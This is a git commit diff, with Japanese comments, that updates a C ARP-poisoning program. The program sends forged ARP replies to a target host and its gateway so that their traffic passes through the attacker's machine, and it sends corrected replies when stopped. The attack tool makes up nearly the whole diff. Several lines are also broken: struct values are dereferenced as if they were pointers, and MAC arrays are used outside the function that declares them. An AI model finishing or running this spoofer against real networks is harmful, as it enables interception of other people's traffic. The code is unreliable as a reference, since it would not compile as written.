3ce25dc82689b94bcd4e5e98f2e493dab11d3241
飛田大二郎 <pelo.canvas@gmail.com>
2020-08-18 23:47:49 +0900

    update arp poisoning program.

--- scripts/c/peloet/arp_poison.c
+++ scripts/c/peloet/arp_poison.c
@@ -17,37 +17,103 @@ extern PARAM Param;
 
 int isPoisoning = 0;
 
-struct in_addr target1;
-struct in_addr target2;
+struct in_addr target_addr;
+struct in_addr gateway_addr;
 
+/*
+フラグ(isPoisonig=true)が立っている場合は、
+攻撃対象に対して偽装したARP Replyを送り続ける
+thread化する予定
+*/
 void Poison(void)
 {
     if(isPoisoning != 1){ return; }
 
     printf("poisoning now.\n");
+    union {
+        u_int32_t l;
+        u_int8_t c[4];
+    }m_addr, t_addr, g_addr;
 
+    //targetPCのIPアドレス
+    t_addr.l = target_addr.s_addr;
+    //gatewayのIPアドレス
+    g_addr.l = gateway_addr.s_addr;
+    //my IP Address
+    m_addr = Param.vip;
+
+    u_int8_t t_mac[6];
+    u_int8_t g_mac[6];
+    ArpSearchTable(*target_addr, t_mac);
+    ArpSearchTable(*gateway_addr, g_mac);
+    
+    // send ARP Reply to target PC
     ArpSend
     (
-        soc, //soc
+        soc,         //soc
         ARPOP_REPLY, //op
-        Param.vmac,//e_smac
-        dmac,      //e_dmac
-        Param.vmac,//smac
-        dmac,//dmac
-        saddr.c,   //saddr
-        daddr.c
-    );  //daddr
+        Param.vmac,  //e_smac 自分から送る gatewayでも良い？
+        t_mac,       //e_dmac targetに送る
+        Param.vmac,  //smac   自分のMACを送る(本来ならgateway)
+        t_mac,       //dmac   targetのMACを送る
+        g_addr.c,    //saddr  gatewayのIPアドレス
+        t_addr.c     //daddr  targetのIPアドレス
+    );
+
+    // send ARP Repley to target gateway
+    ArpSend
+    (
+        soc,         //soc
+        ARPOP_REPLY, //op
+        Param.vmac,  //e_smac 自分から送る targetでも良い？
+        g_mac,       //e_dmac gatewayに送る
+        Param.vmac,  //smac   自分のMACを送る(本来ならtarget)
+        g_mac,       //dmac   gatewayのMACを送る
+        t_addr.c,    //saddr  targetのIPアドレス
+        g_addr.c     //daddr  gatewayのIPアドレス
+    );
 
 }
 
-void StartPoison(int soc, struct in_addr *tar1, struct in_addr *tar2)
+void StartPoison(int soc, struct in_addr *target, struct in_addr *gateway)
 {
     isPoisoning = 1;
-    target1 = *tar1;
-    target2 = *tar2;
+    target_addr = *target;
+    gateway_addr = *gateway;
 }
 
 void StopPoison(void)
 {
+    printf("[*]Stop ARP Poison");
     isPoisoning = 0;
+    int i;
+    // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
+    for(i = 0; i < 5; i++)
+    {
+        // targetに正しいgatewayに関するARP Replyを送信
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る
+            t_mac,       //e_dmac targetに送る
+            g_mac,       //smac   gatewayのMACを送る
+            t_mac,       //dmac   targetのMACを送る
+            g_addr.c,    //saddr  gatewayのIPアドレス
+            t_addr.c     //daddr  targetのIPアドレス
+        );
+
+        // gatewayに正しいARP Replyを送信
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る
+            g_mac,       //e_dmac gatewayに送る
+            t_mac,       //smac   targetのMACを送る
+            g_mac,       //dmac   gatewayを送る
+            t_addr.c,    //saddr  targetのIPアドレス
+            g_addr.c     //daddr  gatewayのIPアドレス
+        );
+    }
 }
